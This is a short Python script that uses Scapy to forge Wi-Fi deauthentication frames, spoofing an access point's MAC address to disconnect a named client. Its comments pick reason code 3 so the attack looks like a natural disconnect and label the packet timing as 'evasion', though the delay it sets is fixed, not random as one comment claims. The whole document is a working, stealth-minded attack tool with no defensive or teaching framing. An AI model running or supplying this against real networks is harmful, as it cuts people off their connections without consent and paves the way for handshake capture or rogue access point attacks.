#!/usr/bin/env python3
# Scapy — craft deauths with custom reason codes
from scapy.all import *

# Reason code 3 = "Deauthenticated because sending STA is leaving"
# Looks like a natural client disconnect from the AP's perspective
ap_mac = "14:8C:4A:B4:F4:8C"
client_mac = "20:3B:69:CE:88:3D"
iface = "wlan0mon"

# Craft deauth from AP to client (reason 3)
pkt = RadioTap() / Dot11(
    addr1=client_mac,   # destination
    addr2=ap_mac,       # source (spoofed AP)
    addr3=ap_mac        # BSSID
) / Dot11Deauth(reason=3)

# Send with random inter-packet delay (evasion)
sendp(pkt, iface=iface, count=3, inter=0.5)
